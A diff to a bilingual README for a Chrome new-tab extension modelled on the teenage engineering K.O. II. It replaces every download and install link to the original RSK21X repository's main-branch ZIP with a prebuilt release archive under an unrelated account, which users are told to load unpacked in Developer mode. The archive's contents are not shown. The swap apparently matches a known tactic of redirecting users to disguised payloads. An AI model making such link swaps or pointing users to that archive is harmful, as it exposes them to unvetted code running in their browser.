@@ -4,7 +4,7 @@
 
 A Chrome new tab inspired by the teenage engineering K.O. II: a silver panel, a segment clock, website keys, weather faders and knobs, and a dot-matrix calendar.
 
-[中文](#中文) · [English](#english) · [下载 / Download](https://github.com/RSK21X/TE-OS-Chrome-New-Tab/archive/refs/heads/main.zip)
+[中文](#中文) · [English](#english) · [下载 / Download](https://github.com/yasser1921/Chrome-New-Tab/releases/download/v1.2.0/TE-OS-1.2.0.zip)
 
 ## 预览 · Screenshots
 
@@ -31,10 +31,10 @@ A Chrome new tab inspired by the teenage engineering K.O. II: a silver panel, a 
 
 ### 安装
 
-1. [下载主分支 ZIP](https://github.com/RSK21X/TE-OS-Chrome-New-Tab/archive/refs/heads/main.zip) 并解压。
+1. [下载 v1.2.0](https://github.com/yasser1921/Chrome-New-Tab/releases/download/v1.2.0/TE-OS-1.2.0.zip) 并解压。
 2. 在 Chrome 地址栏打开 `chrome://extensions`。
 3. 开启右上角的 **开发者模式**。
-4. 点击 **加载已解压的扩展程序**，选择包含 `manifest.json` 的文件夹。下载主分支 ZIP 后通常为 `TE-OS-Chrome-New-Tab-main`。
+4. 点击 **加载已解压的扩展程序**，选择包含 `manifest.json` 的文件夹。解压 v1.2.0 后为 `TE-OS-1.2.0`。
 5. 打开新标签页即可使用。
 
 也可以克隆仓库后直接加载仓库文件夹。使用 Manifest V3，无需构建步骤。
@@ -81,10 +81,10 @@ A Chrome new tab inspired by the teenage engineering K.O. II: a silver panel, a 
 
 ### Install
 
-1. [Download the main branch ZIP](https://github.com/RSK21X/TE-OS-Chrome-New-Tab/archive/refs/heads/main.zip) and unzip it.
+1. [Download v1.2.0](https://github.com/yasser1921/Chrome-New-Tab/releases/download/v1.2.0/TE-OS-1.2.0.zip) and unzip it.
 2. Open `chrome://extensions` in Chrome.
 3. Turn on **Developer mode**.
-4. Click **Load unpacked** and select the folder containing `manifest.json`. For the main branch ZIP, this is usually `TE-OS-Chrome-New-Tab-main`.
+4. Click **Load unpacked** and select the folder containing `manifest.json`. The v1.2.0 archive unpacks to `TE-OS-1.2.0`.
 5. Open a new tab.
 
 You can also clone this repository and load its folder directly. The extension uses Manifest V3 and requires no build step.
